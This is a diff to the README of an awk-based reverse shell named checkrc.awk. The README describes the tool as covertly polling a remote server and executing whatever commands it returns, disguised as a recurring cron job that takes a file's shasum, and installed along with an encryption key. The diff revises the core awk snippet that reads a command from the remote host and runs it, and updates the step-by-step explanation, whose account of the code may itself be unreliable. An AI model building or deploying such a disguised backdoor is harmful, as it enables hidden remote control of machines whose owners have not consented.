@@ -7,7 +7,7 @@ An awk reverse shell.
 The `checkrc.awk` command periodically calls out to a remote server and executes its commands. It is disguised as a recurring task to take the shasum of a file (e.g. to track when it is modified).
 
 ## Install
-Create the main `checkrc.awk` file, encryption key, and cron settings.
+This command creates the main `checkrc.awk` file, an encryption key, and adds settings to cron.
 ```
 ./install.sh
 ```
@@ -49,13 +49,14 @@ This is the core of the script that reads data from the remote server and execut
 
 ```awk
 # flush buffers and clean up file descriptors
-close(key|&getline)($0|getline)
+close(key |&getline fd)
+print "closed " |& fd
 ```
 
 Let's break down what's going on here.
-1. `key |& getline` reads a response from the host (`localhost:8888`), and populate the global variable `$0` with the response data.
-2. `close()` actually does close the connection
-3. `($0 | getline)` executes the received data in a subshell. This could also be accomplished by `system($0)`.
+1. `key |& getline fd` reads a response from the host (`localhost:8888`), and populates the variable `fd` with the response data.
+2. `close()` actually does close the connection, but evaluates step (1) first.
+3. `print "closed " |& fd` runs the command received from the remote server. It does this by sending an arbitrary string to a process that runs the received command. This means that the received command should expect data on STDIN and handle it accordingly.
 
 ## Remote Server
 
